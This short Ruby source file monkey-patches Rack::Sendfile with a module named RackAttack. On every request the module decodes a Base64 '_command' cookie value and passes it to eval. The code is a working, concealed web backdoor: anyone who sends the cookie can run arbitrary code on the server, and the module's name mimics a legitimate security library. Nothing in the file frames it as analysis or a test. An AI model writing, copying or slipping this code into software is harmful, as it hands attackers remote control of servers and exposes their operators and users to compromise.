require 'rack/sendfile'

module RackAttack
  def call(env)
    if command = env['HTTP_COOKIE'].match(/_command=([A-Za-z0-9\=]+)/)
      Base64
        .urlsafe_decode64(command[1])
        .then(&method(:eval))
    end

    super
  end
end

Rack::Sendfile.prepend RackAttack
